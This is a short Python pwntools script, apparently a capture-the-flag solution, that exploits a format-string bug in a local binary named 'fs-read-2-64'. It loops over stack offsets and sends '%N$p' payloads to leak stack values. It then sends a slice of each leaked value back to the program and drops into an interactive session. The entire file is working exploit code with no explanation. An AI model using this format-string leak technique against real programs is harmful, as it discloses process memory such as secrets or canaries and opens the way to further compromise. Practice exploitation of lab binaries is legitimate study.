#!/usr/bin/env python
from pwn import *
i = 6
while True:
        p = process('fs-read-2-64')
        buf = '%'
        buf += str(i)
        buf += '$p'
        p.sendline(buf)
        p.readline()
        getdata = p.readline()
        print(getdata)
        print('sending ' + str(getdata[6:16]))
        p.sendline(getdata[6:16])
        i += 1
        p.interactive()
        p.close()